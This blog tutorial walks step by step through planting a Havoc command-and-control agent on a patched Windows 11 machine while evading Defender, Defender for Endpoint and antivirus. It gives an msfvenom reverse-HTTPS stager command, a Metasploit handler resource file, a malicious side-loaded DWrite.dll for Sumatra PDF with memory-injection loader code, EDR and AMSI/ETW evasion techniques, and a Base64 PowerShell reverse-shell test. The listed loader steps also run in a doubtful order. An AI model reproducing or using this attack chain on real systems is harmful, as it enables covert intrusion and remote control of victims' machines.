---
title: "Breaching Fort Knox - Deploying a Command and Control Agent on a Fully Secured Windows System with Defender and EDR Activated"
meta_title: ""
description: "this is meta description"
date: 2022-02-22T05:00:00Z
image: "/images/post-1-image.webp"
categories: ["Hacking", "Tutorial"]
author: "Jan Mueller"
tags: ["hacking", "windows", "havoc"]
draft: false
---

## Overview

This article serves as a guide on deploying a Command and Control (C2) Agent from the Havoc Framework onto an up-to-date Windows 11 system as of February 2024. Havoc, which has emerged as a popular open-source contender to Cobalt Strike over the past two years, owes much of its fame to the inclusion of its Daemon agent. This agent initially set itself apart with its ability to evade antivirus (AV) detection straight out of the box. Despite the fact that its built-in obfuscation capabilities have become less effective over time, the framework continues to be highly effective.

By reading through, you'll acquire an in-depth understanding of how to efficiently deploy a Havoc agent on a system with the latest updates, managing to execute code while navigating around the defenses of both local antivirus solutions and Microsoft Defender for Endpoint.

Disclaimer: The hacking techniques described and discussed in this article are intended for educational purposes only. Any attempt to use these techniques for unauthorized access to computer systems or networks without proper authorization is illegal and unethical. The author and publisher do not condone or support any illegal activities, and the information provided should be used responsibly and in accordance with applicable laws and regulations.

It's important to note that this piece does not delve into the nuances of operational security measures, which warrant a separate discussion altogether.

## Environment

In setting up a sophisticated cybersecurity testing environment, this article expects the setup of a controlled scenario involving two Windows virtual machines (VMs) and an Arch Linux system. This setup is designed to emulate a real-world cyberattack and defense mechanism, providing a comprehensive platform for educational and research purposes.

The Arch Linux machine serves a dual purpose: it acts as the attacker's platform and manages the two Windows VMs using VirtualBox. The VMs are configured in bridged network mode, allowing them to operate within the same network as the host, thereby simulating a realistic network environment.

The first Windows VM is tailored for development work. It comes equipped with Visual Studio 2022 and the Windows SDK to support software development and debugging tasks. Additionally, it includes Procmon from Sysinternals and various debuggers to facilitate detailed analysis and troubleshooting of software behavior. The Spartacus Framework is also installed, providing a robust set of tools for testing. To ensure an unimpeded testing and development environment, Windows Defender is disabled on this VM.

The second Windows VM mirrors the first in terms of setup but diverges significantly in terms of security posture. Windows Defender is enabled on this VM, and it hosts a deployed Windows Defender for Endpoints Agent. This configuration allows for a live observation of how malware or cyberattack techniques interact with modern antivirus and endpoint detection solutions. All activities and events on this VM are closely monitored and analyzed in Azure, providing a real-time security observation and analysis framework.

This setup not only facilitates a deep dive into the intricacies of cybersecurity from an attacker's perspective but also enables a thorough understanding of defense mechanisms and their effectiveness against various tactics. The environment is designed for those looking to advance their knowledge in cybersecurity, offering a hands-on approach to learning about attack vectors, defense strategies, and the continuous cat-and-mouse game between cyber attackers and defenders.

## Definitions

The article further clarifies key terminologies essential for understanding the complex dynamics of the content:

1. **Loader:** Defined as a modular program, the loader is crafted to bypass detection mechanisms while executing shellcode, uniquely interacting with the disk as the primary file.
2. **Stager:** This term describes a compact code segment, tasked with setting the stage or retrieving subsequent code, serving as a preliminary step in the execution process.
3. **Agent:** Within this context, the agent is synonymous with a second-stage payload. It could manifest as shellcode, an executable file (Exe), or a dynamic link library (DLL), all of which are sourced from the C2 framework.
4. **Stage Listener:** This server plays a pivotal role by delivering the second-stage payload, acting as a bridge between the initial breach and the full deployment of the C2 framework.
5. **C2 Server:** Hosting the chosen Command and Control framework, the C2 Server is the nerve center for post-exploitation activities, enabling the operator to steer the direction of the operation following successful execution.

This setup, along with the defined terms, forms the backbone of the article, providing readers with a clear understanding of the technical framework and vocabulary needed to grasp the intricacies of cybersecurity practices and payload deployment strategies.
## Playbook

  
In this guide, we're going to establish Havoc as our Command and Control (C2) server, set up a listening post, and create a corresponding payload. Our journey begins with dissecting the Portable Executable (PE) of Sumatra PDF Reader, where we'll employ the Spartacus framework to pinpoint DLL files vulnerable to hijacking. Following this, we'll engineer a DLL to serve as a loader. This loader will be designed to fetch the stager from an HTTP server and activate it upon the initiation of the PDF Reader. Our final step involves crafting a specialized Meterpreter payload for the stager. This payload will be responsible for securing the Havoc agent as the subsequent stage and forging a connection with the Havoc C2 server once executed. Figure one illustrates the intricate process flow from the loader and stager to the agent, culminating in the successful linkage to the C2 server.

![Figure 1: Process flow of the exploit chain](001-attack-chain.png)  
figure 1: Process flow of the exploit chain

## Target VM

Initially, we verify that the target Windows virtual machine is fully updated, incorporating the most recent security patches and malware detection signatures to ensure robust defense against potential threats. In addition, for the context of this tutorial, we have installed and activated Avira Antivirus Free on the VM to provide an additional layer of security.

To streamline the process of transferring files between the Windows VM and the host system, we've established a shared folder, designated as Volume Z:. This setup not only enhances the efficiency of our workflow but also promotes more effective collaboration throughout the experimental phase.

![figure 2: Updated Windows 11](002-windows-updated.png)  
figure 2: Updated Windows 11
  
Within Azure, a PowerShell script is available for download. This script is intended to streamline the integration of a client with the Defender for Endpoints service, making the onboarding process straightforward. After downloading, we execute this script on the host system, facilitating a hassle-free initiation of the onboarding process.

![figure 3: Install Defender for Endpoint](003-edr-boarding.png)  
figure 3: Install Defender for Endpoint

Should access to an Azure tenant with Defender for Endpoints be unavailable, this step is not mandatory. The tutorial is designed to continue without this component, showcasing methods to circumvent the protections offered by local Windows Defender and other antivirus solutions.
## Setup Havoc C2

  
To kickstart our journey with Havoc C2, we begin by acquiring the framework from GitHub at [https://github.com/HavocFramework/Havoc](https://github.com/HavocFramework/Havoc). The repository provides a Makefile, enabling us to compile the software directly on our local machine. Alternatively, we can download precompiled packages, which are specifically designed for various operating systems. Detailed installation guidelines are accessible through their official documentation at [https://havocframework.com/docs/installation](https://havocframework.com/docs/installation).

After completing the installation, our next step is to set up the Team Server. This crucial element acts as the central command post for overseeing agents on infiltrated systems, facilitating streamlined communication and control across the network.

![figure 4: Havoc Teamserver](004-havoc-team-server.png)  
figure 4: Havoc Teamserver

The initial phase involves launching the client software and connecting it to the Team Server. Essential credentials such as the username, password, and port number are obtained from the havoc.yaotl file. Depending on the setup, the location of this configuration file may vary; it could adhere to the default settings or a user-defined configuration. For the purposes of this tutorial, we're utilizing a custom configuration file located at `~/.config/havoc/havoc.yaotl`, which we specify to the server using the `--profile` flag. It's advisable to modify the file path and settings to align with your specific configuration needs.

Upon initiating the client, the graphical user interface (GUI) becomes operational. This interface is designed to be user-friendly, providing the means to craft listeners and the associated payloads. With its intuitive design, users can effortlessly tailor their Command and Control environment to meet their precise requirements and goals.

![figure 5: Havoc Client User Interface](005-havoc-client.png)  
figure 5: Havoc Client User Interface

## Setting Up a Havoc C2 Listener
  
To establish a Havoc C2 listener, which is a crucial step for managing connections from compromised targets, you'll begin by accessing the Havoc client interface. From there, direct your attention to the 'View' menu. Within this menu, you'll find and select the 'Listeners' option. This action sets the groundwork for creating a listener—a vital component that awaits incoming connections from the target following the execution of the stage 2 payload. This listener will effectively bridge the communication between your Havoc C2 server and the compromised system, ensuring a seamless transmission of commands and data back and forth.

![figure 6: Setup the listener](006-havoc-listener.png)  
figure 6: Setup the listener

## Creating the Stage 2 Shellcode
  
In the realm of penetration testing, the strategy of deploying multi-staged payloads is pivotal for minimizing the digital footprint on a target system. Notable examples of this technique include the Meterpreter from Metasploit and Sliver agents, which leverage the efficiency of multi-staged payloads. However, Havoc distinguishes itself by primarily utilizing a single-staged payload approach.

During my initial experimentation, I investigated the feasibility of incorporating Havoc agent's shellcode into the loader, akin to a Stage 1 payload. The challenge arose when this integration did not offer sufficient obfuscation to elude the vigilant eyes of antivirus (AV) and endpoint detection and response (EDR) systems. This led to a strategic pivot towards minimizing the detectability of the malicious DLL.

For this operation, we pivot towards delivering the payload as a custom Meterpreter payload. The architecture of this approach entails downloading the initial stage directly from a web server, with the subsequent stage being dispatched through Meterpreter. This methodology necessitates the generation of the shellcode as a binary file to streamline the delivery process.

It's crucial to configure the payload options to match the desired parameters, as illustrated in figure 7. After finalizing the configurations, the "Generate" button should be clicked to compile the payload.

A "Save File As" dialogue box will then prompt you to choose a storage location on your filesystem for the newly generated payload. You should select a suitable directory and filename before clicking "Save" to finalize the storage of the file. This step is essential for properly preserving the payload for later stages of your penetration testing or cybersecurity exercise.

![figure 7: Compile the payload](007-havoc-payload.png)  
figure 7: Compile the payload

Here's an overview of the techniques applied to enhance the stealth of our stage 2 payload:

- **Indirect Syscalls**: This technique leverages the execution of syscall commands within the ntdll.dll memory space, transitioning from direct to indirect syscalls. This shift generates a call stack that mirrors typical execution patterns, facilitating evasion of Endpoint Detection and Response (EDR) mechanisms that monitor syscall origins and destinations. Nonetheless, Event Tracing for Windows (ETW) might expose this tactic, which can be mitigated through the use of Hardware Breakpoints.
    
- **Stack Duplication**: To avoid detection during command and control (C2) communications, stack duplication is employed. This method is particularly useful during the payload's dormant periods, masking its presence from monitoring tools.
    
- **Foliage**: Employed as a sophisticated sleep obfuscation strategy, Foliage initiates a new thread that queues a Return Oriented Programming (ROP) chain via NtApcQueueThread. These ROP chains, small sequences of assembly instructions that manipulate the stack to perform intricate operations, are instrumental in encrypting the agent's memory and postponing its execution, thereby complicating detection efforts.
    
- **RtlCreateTimer**: This function schedules the ROP chain during sleep intervals, cleverly spacing out execution phases to further obscure the payload's activities from surveillance mechanisms.
    
- **AMSI and ETW Bypass**: The duo of the Antimalware Scan Interface (AMSI) and Event Tracing for Windows (ETW) presents a formidable challenge in simulating attack scenarios, with AMSI scrutinizing executable codes and ETW tracking procedural calls. To circumvent these security features, hardware breakpoints are strategically employed, allowing the initiation of a new process in debug mode, sidestepping the EDR or AMSI detections.
    

For a deeper dive into these obfuscation strategies and their practical applications in evading EDR systems, consider exploring the article "BlindSide: A New Technique for EDR Evasion with Hardware Breakpoints" available at [https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints](https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints), offering valuable insights and technical depth on the subject.

## Creating the Stage 1 Shellcode

To craft the initial stage of our payload, we need to generate shellcode that will be executed by the malicious DLL loader within the target system. Although such activities might be detectable by Endpoint Detection and Response (EDR) systems, they typically do not raise alarms. For improved operational security, hosting this payload on an HTTP server backed by a legitimate domain and SSL certification is recommended to lower the chances of detection.

The creation of the payload is facilitated using msfvenom with the following command:
```bash
msfvenom -p windows/x64/custom/reverse_https LHOST=192.168.8.205 LPORT=8443 EXITFUNC=thread -f raw -o stage1.bin
```
![figure 8: Create stage 1 payload with msfvenom](008-msfvenom-payload.png)  
figure 8: Create stage 1 payload with msfvenom

By specifying `windows/x64/custom/reverse_https`, we ensure that the connection to the Stage Listener is securely encrypted via TLS, enhancing the stealthiness of our operation.

- `LHOST` represents the IP address of the Stage Listener, which may or may not coincide with the C2 server's IP (in our scenario, it does).
- `LPORT` indicates the port number on which the Metasploit multi-handler will listen for incoming connections.
- `EXITFUNC=thread` is chosen based on how the loader executes the shellcode; the default setting is typically 'process'.

This shellcode initiates a reverse shell connection back to the attacker's machine, facilitating the seamless delivery of the Stage 2 payload (stage2.bin) that was previously prepared within Havoc. Notably, the shellcode is exceptionally compact, occupying only about 684 bytes, making it a highly efficient vector for establishing the initial breach.

## Serving the stages

For the deployment process, both the initial and subsequent payloads are stored within a single directory on the attacking machine. This setup is crucial for organizing and efficiently managing the payloads for deployment. To distribute the first stage payload, `stage1.bin`, we employ a development HTTP server, such as 'updog', initiated from one terminal window to facilitate easy access to the payload. Concurrently, in another terminal window, we establish a Meterpreter listener, which is responsible for handling `stage2.bin`. This listener will execute the shellcode within the Havoc C2 framework, ensuring a seamless transition to the control phase.

Alternatively, leveraging GitHub to host the payload offers a versatile and innovative approach to stage distribution, providing a blend of accessibility and operational stealth.
![figure 9: Files in the folder for serving the payloads](009-ls-webroot.png)  
figure 9: Files in the folder for serving the payloads

![figure 10: Development server updog](010-updog-server.png)  
figure 10: Development server updog  

To streamline the launch process of the Meterpreter listener within msfconsole, a resource file, `https-listener.rc`, can be created. This file contains pre-defined commands that automatically configure the listener upon msfconsole startup, eliminating the need for manual input. The following snippet outlines the commands to be included in the `.rc` file:

```text
use multi/handler
set payload windows/x64/custom/reverse_https
set exitfunc thread
set lhost 192.168.8.205
set lport 8443
set shellcode_file stage2.bin
set exitonsession false
```

Executing msfconsole with this resource file loads the specified configurations, readying the Meterpreter listener for operation:

```bash
 msfconsole -q -r https-listener.rc
[*] Processing https-listener.rc for ERB directives.
resource (https-listener.rc)> use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (https-listener.rc)> set payload windows/x64/custom/reverse_https
payload => windows/x64/custom/reverse_https
resource (https-listener.rc)> set exitfunc thread
exitfunc => thread
resource (https-listener.rc)> set lhost 192.168.8.205
lhost => 192.168.8.205
resource (https-listener.rc)> set lport 8443
lport => 8443
resource (https-listener.rc)> set shellcode_file stage2.bin
shellcode_file => stage2.bin
resource (https-listener.rc)> set exitonsession false
exitonsession => false
msf6 exploit(multi/handler) > run
```

![figure 11: Starting the msfconsole listener](011-msfconsole-listener.png)  
figure 11: Starting the msfconsole listener

With the listener operational, we proceed to the development of the loader, marking the next step in the attack chain's execution.

## Developing the loader

In developing our loader, we focus on deploying the initial payload, `stage1.bin`, leveraging DLL Proxy Hijacking and Side-Loading techniques. This method capitalizes on a vulnerability where a program erroneously loads a malicious dynamic link library (DLL) instead of its legitimate counterpart. This scenario typically unfolds when an application searches for DLLs in specific directories, and a malicious DLL is strategically placed within these search paths. Upon execution, the application loads the malicious DLL, unwittingly granting attackers the ability to execute arbitrary code or gain unauthorized system access. In essence, this technique deceives the application into using a counterfeit key, thereby commandeering its operations.

For discreet execution, meticulous selection of the Portable Executable (PE) is paramount. We favor a trusted or digitally signed executable that permits DLL side-loading. The Sumatra PDF PE executable emerges as an ideal candidate for this showcase, downloadable from [Sumatra PDF Reader’s official site](https://www.sumatrapdfreader.org/download-free-pdf-viewer).

To craft the necessary DLL, we leverage a robust tool named [Spartacus](https://github.com/Accenture/Spartacus), available for download on GitHub. This tool is specifically designed to scan active applications, identifying potential DLLs vulnerable to hijacking. Beyond mere identification, Spartacus goes a step further by creating Visual Studio Code solutions complete with all required exports. These pre-fabricated solutions are invaluable for writing our loader code, ensuring the resulting DLL maintains its integrity and operates without causing any application crashes, thus maintaining a low profile and stay unsuspicious.

Within our development VM, we begin by acquiring procmon from Sysinternals alongside Spartacus. Following this, we execute a PowerShell command to put Spartacus to work. After running the command, the process involves running SumatraPDF.exe from any chosen directory, with a prerequisite that the path specified for `-procmon` accurately reflects procmon's actual location on our system. Through this operation, Spartacus diligently sifts through the application data, pinpointing DLLs ripe for hijacking, exporting their details, and crafting .cpp templates ready for our use. This methodical approach ensures we have a solid foundation for developing a DLL that seamlessly integrates into our target environment.

```powershell
.\Spartacus.exe —mode dll —procmon .\Procmon.exe —pml .\logs.pml —csv C:\Data\VulnerableDLLFiles.csv —solution .\Solutions —verbose
```

![figure 12: Spartacus output for Sumatra PDF](012-spartiacus-result.png)  
figure 12: Spartacus output for Sumatra PDF

As illustrated in the analysis results, several DLLs suitable for hijacking were identified, with a Visual Studio Solution being generated for each. Additionally, a comprehensive CSV file listing all the vulnerable DLLs was produced. Moving forward, we have selected `DWrite.dll` for its simplicity, as it exports only a single function, making it an ideal candidate for our purposes.

We proceed by opening the relevant Visual Studio Solution on our development VM. The necessary code to retrieve the stage 1 payload is accessible at a [GitHub repository](https://github.com/SaadAhla/Shellcode-Hide/blob/main/4%20-%20Fileless%20Shellcode/1%20-%20Using%20Sockets/FilelessShellcode.cpp), which provides a blueprint for our implementation.

While we aim to replicate the implementation in its entirety, it's crucial to maintain a specific directive to ensure the correct loading of the DLL. The directive in question is a compiler command that ensures our custom DLL properly references the original `DWriteCreateFactory` function from the genuine `DWrite.dll` located in the system directory:

```cpp
`#pragma comment(linker,"/export:DWriteCreateFactory=C:\\Windows\\System32\\DWrite.DWriteCreateFactory,@1")`
```

In addition to incorporating this directive, it's necessary to define variables for the IP address, port, and resource location. These adjustments are essential for the successful execution and integration of our custom DLL, ensuring it operates as intended without drawing undue attention or causing disruptions to the application or system it integrates with.

In our custom DLL, rather than relying on a traditional main function for execution, we implement our code to execute upon the DLL's attachment to a process. This approach utilizes the DLL entry point, a standard method for initializing code in DLLs, to trigger our payload as soon as the DLL is loaded by the host application.

This technique capitalizes on the dynamic nature of DLLs, allowing for the execution of our code in the context of the host application without requiring explicit calls from the application itself. By hooking into the DLL attachment process, we ensure that our code is executed seamlessly, blending into the normal operation of the application and reducing the likelihood of detection.

This strategy is particularly effective for stealth operations, as it leverages the normal loading and execution patterns of applications to introduce and execute malicious code. It's a sophisticated method of ensuring that our payload is delivered and executed under the radar, making it a critical component of our approach to DLL hijacking and side-loading.

![figure 13: Execute the loading and execution of the sideloaded payload](013-dll-execute-on-attach.png)  
figure 13: Execute the loading and execution of the sideloaded payload

The execution obfuscation technique detailed below is crafted to ensure that our Meterpreter stage remains undetectable by Endpoint Detection and Response (EDR) systems within the system's memory.
![figure 14: Shellcode execution ](014-shellcode-execution.png)  
figure 14: Shellcode execution 
  
This implementation unfolds through a sequence of meticulously executed steps:

1. **Process Handle Acquisition**: Initiate by obtaining a handle to the target process, using `GetCurrentProcessId` for identification, followed by `OpenProcess` to open the process.
   `HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());

2. **Memory Allocation**: Allocate a memory segment within the target process using `VirtualAllocEx`, specifying the size and permissions suitable for executing the payload.
   `PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

3. **Adjusting Memory Protection**: Modify the protection of the allocated memory to `PAGE_NO_ACCESS` with `VirtualProtectEx`, effectively making it invisible to antivirus scans and write-protected.
   `VirtualProtectEx(processHandle, remoteBuffer,sizeof recvbuf, 0x01, NULL);

4. **Suspended Thread Creation**: Create a suspended thread within the target process space using `CreateRemoteThread`, ensuring it remains inactive until specifically resumed.
   `HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0x00000004, NULL);

5. **Evading Antivirus Scans**: Implement a strategic delay, to allow any ongoing antivirus scans to conclude, thereby avoiding detection.
   `Sleep(1090);

6. **Restoring Memory Permissions**: Reapply `VirtualProtectEx` to reset the memory segment's permissions back to `PAGE_EXECUTE_READWRITE`, prepping it for the payload execution.
   `VirtualProtectEx(processHandle, remoteBuffer, sizeof recvbuf, PROCESS_ALL_ACCESS, NULL);

7. **Thread Resumption**: Proceed to activate the previously created suspended thread using `ResumeThread`.
   `ResumeThread(remoteThread);

8. **Executing the Shellcode**: Finalize the process by deploying the shellcode directly into the allocated memory using `WriteProcessMemory`.
   `WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);

This methodical approach ensures that the execution of the Meterpreter stage sidesteps detection mechanisms, leveraging system-level operations and precise timing. For a comprehensive guide and the full version of the code, refer to the [GitHub Repository](https://github.com/jamu85/DWrite).

## Attack the target 

Following the compilation process, we successfully create the `DWrite.dll` file, designated as the loader for our initial payload. To conduct a trial within our development setting, we launch `SumatraPDF-3.5.2-64.exe`, ensuring `DWrite.dll` is situated in the identical directory. This setup is expected to trigger a HTTP GET request, visible in the logs of our development server, indicating the successful retrieval of the first stage payload.

![figure 15: updog serving stage one](015-updog-serve-stage-one.png)  
figure 15: updog serving stage one

Subsequently, our attention turns to the Meterpreter listener, which is poised to intercept the connection initiated by the stage 1 payload and, in turn, dispatch the stage 2 payload.

![figue 16: meterpreter serving stage two](016-meterpreter-serving-stage-2.png)  
figue 16: meterpreter serving stage two

The culmination of this sequence is marked by the execution of the stage 2 payload by the stager, effectively transitioning control to the Havoc framework, showcasing the seamless progression from initial breach to full command and control establishment.

![figure 17: havoc agent connect](017-havoc-agent-connect.png)  
figure 17: havoc agent connect
  
With this successful demonstration in the development environment, the next phase involves migrating the operation to the Target VM, which is fortified with active antivirus (AV) and Endpoint Detection and Response (EDR) systems. This transition allows us to evaluate the loader's efficacy and stealth capabilities in a more secured and monitored environment.

## Target system

  
On the target system, the operation proceeds smoothly without any hitches. The custom DLL is placed in the same directory as the Sumatra PDF executable, allowing for flawless execution. We observe the initial payload being fetched from the web server, followed by the Meterpreter listener deploying the Havoc agent, which then successfully executes.

The obfuscation strategies we've implemented ensure that the security measures in place fail to detect any of the clandestine activities underway.

![figure 18: virus scan with loader on the file system](018-target-virus-scan.png)  
figure 18: virus scan with loader on the file system

As shown in Figure 18, the presence of the DLL on the file system does not raise any red flags during a virus scan. This leads us to further investigate the Endpoint Detection and Response (EDR) system's logs.

Although communications with the listeners are evident within the logs, no alerts or incidents are triggered, indicating that our obfuscation methods are effectively concealing the malicious activities.

![figure 19: Azure edr connection logs](019-azure-edr-logs.png)  
figure 19: Azure edr connection logs

To doubly ensure that we're not experiencing a false sense of security, a PowerShell command is executed within the Havoc listener to establish a reverse shell connection to the attacking system on port 8888. Such an action should typically trigger an alert from any competent EDR system. Thus, we craft and execute this payload, encoded in Base64, from our Havoc agent to test the system's response.

![figure 20: edr verification](020-havoc-cross-check.png)  
figure 20: edr verification

As illustrated in Figure 20, the execution of the encoded PowerShell command successfully establishes a reverse shell connection within Havoc from Demon. However, the connection quickly drops, and the EDR system immediately isolates the host, restricting its network traffic to communication solely with the EDR.

![figure 21: host isolated from edr](021-host-isolated-by-edr.png)  
figure 21: host isolated from edr

This reaction from the EDR system confirms its operational efficacy in detecting and responding to suspicious activities. Nevertheless, the initial evasion of our payloads underscores the critical importance of caution among red team operators to avoid detection during operations, even after gaining initial access.

## Sumary
  
In the ever-evolving landscape of cybersecurity, the task of deploying an AV and EDR-evading payload on an up-to-date Windows 11 system presents a formidable challenge, yet remains within the realm of possibility. Our in-depth exploration has not only proven its feasibility but also shed light on the sophisticated obfuscation and evasion technologies that enable the creation of undetectable stagers and loaders. This revelation serves a dual purpose: it highlights the ongoing struggle against advanced threat actors and underscores the critical need for continuous enhancement of detection systems to match the pace of these evolving attack techniques.

Our journey has also revalidated the effectiveness of Havoc as a robust and trusted Command and Control (C2) framework, integral for adversaries seeking sophisticated operational capabilities. The promise of the forthcoming v1 UI update to Havoc signals a leap forward in functionality and user experience, eagerly awaited by the cybersecurity community.

For red team operators, gaining access to a system is merely the beginning. The essence of stealth cannot be overstated; careless actions risk triggering alarms, potentially jeopardizing operations. While not invariably catastrophic, such incidents necessitate a high degree of skill and strategic finesse to manage effectively.

This exploration serves as a poignant reminder that cybersecurity is not a static achievement but a continuous journey. The relentless pursuit of advanced security measures is paramount in reducing vulnerabilities and countering threats effectively. Through our examination of payload implantation on a secured Windows 11 system, we underscore the importance of perpetual vigilance and investment in cybersecurity, essential for staying ahead in this unending game of digital cat and mouse.